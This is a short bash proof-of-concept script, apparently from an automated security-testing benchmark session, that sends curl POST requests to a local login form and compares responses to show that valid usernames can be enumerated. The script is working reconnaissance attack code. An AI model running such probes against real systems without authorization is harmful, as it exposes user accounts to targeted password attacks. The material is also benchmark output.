#!/bin/bash
# POC: Demonstrates username enumeration via different response behaviors for valid vs invalid usernames
# Target: ./repo
# Created: 2025-10-30T19:55:23.960Z
# Session: benchmark-XBEN-001-24-mhdu3kmr

echo "=== Username Enumeration POC ==="
echo "This POC demonstrates how the application reveals valid usernames through response behavior"
echo ""

# Get target URL from argument or use default
TARGET="${1:-http://localhost:8080}"

echo "Target: $TARGET"
echo ""

# Test with a known valid username
echo "[TEST 1] Testing with valid username 'test':"
echo "Request: POST $TARGET/ with username=test"
RESPONSE1=$(curl -s -i -X POST "$TARGET/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test" \
  -L)

echo "$RESPONSE1" | head -20
echo ""

# Check if redirected to /password/ page
if echo "$RESPONSE1" | grep -q "Welcome,"; then
  echo "✓ Result: Valid username detected - redirected to password page with welcome message"
else
  echo "✗ Result: No welcome message found"
fi
echo ""
echo "---"
echo ""

# Test with invalid username
echo "[TEST 2] Testing with invalid username 'nonexistentuser12345':"
echo "Request: POST $TARGET/ with username=nonexistentuser12345"
RESPONSE2=$(curl -s -i -X POST "$TARGET/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=nonexistentuser12345")

echo "$RESPONSE2" | head -20
echo ""

# Check for "User not found" message
if echo "$RESPONSE2" | grep -q "User not found"; then
  echo "✓ Result: Invalid username detected - 'User not found' error message displayed"
else
  echo "✗ Result: No 'User not found' message found"
fi
echo ""
echo "---"
echo ""

# Test another invalid username
echo "[TEST 3] Testing with invalid username 'admin':"
echo "Request: POST $TARGET/ with username=admin"
RESPONSE3=$(curl -s -i -X POST "$TARGET/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin")

echo "$RESPONSE3" | head -20
echo ""

if echo "$RESPONSE3" | grep -q "User not found"; then
  echo "✓ Result: Invalid username detected - 'User not found' error message displayed"
else
  echo "✗ Result: No 'User not found' message found"
fi
echo ""
echo "---"
echo ""

# Summary
echo "=== SUMMARY ==="
echo "The application exhibits different behaviors for valid vs invalid usernames:"
echo ""
echo "Valid username (test):"
echo "  - Redirects to /password/{username} page"
echo "  - Displays personalized welcome message"
echo ""
echo "Invalid username (nonexistentuser12345, admin):"
echo "  - Returns 200 OK without redirect"
echo "  - Displays 'User not found' error message"
echo ""
echo "This behavior difference allows attackers to enumerate valid usernames."
echo ""
echo "VULNERABILITY CONFIRMED: Username enumeration is possible"